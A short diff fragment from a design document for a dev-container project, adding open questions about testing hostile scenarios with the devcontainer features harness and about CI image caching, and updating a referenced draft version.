+3. **Is `devcontainer features test` enough for the hostile scenarios, or does the Feature need a bespoke harness?** The official harness is scenario-per-config, which fits §11's assertions well; whether it can assert on a *build failure's message* — and on a **hang**, now that `remoteDialogSeen` makes a timeout one of the expected verdicts — is the thing to check. If it cannot, those scenarios move into the container tier as direct `up` invocations.
+4. **How warm can the container tier's cache be kept in CI?** The budget in §3 assumes a shared base image survives between runs. On a self-hosted runner it does, trivially; the question is whether the deep lane stays under ten minutes on a cold runner after a dependency bump, or whether it needs an explicit image-cache step.
 
 ### 16.2  Deferred, and what would reopen each
 
@@ -608,4 +700,4 @@ The tiering itself I expect to survive unchanged, because it is derived from whe
 
 ---
 
-*Supplements `docs/design/overall/drydock-design.md` draft v5 and `docs/design/port-forwarding/port-forwarding-design.md` draft v3. §15 contains five findings that are changes to those documents rather than to this one; they are deliberately left unapplied here so the decisions are made where the reasoning lives.*
+*Supplements `docs/design/overall/drydock-design.md` draft v6 and `docs/design/port-forwarding/port-forwarding-design.md` draft v3. §15 contains five findings that are changes to those documents rather than to this one; they are deliberately left unapplied here so the decisions are made where the reasoning lives.*
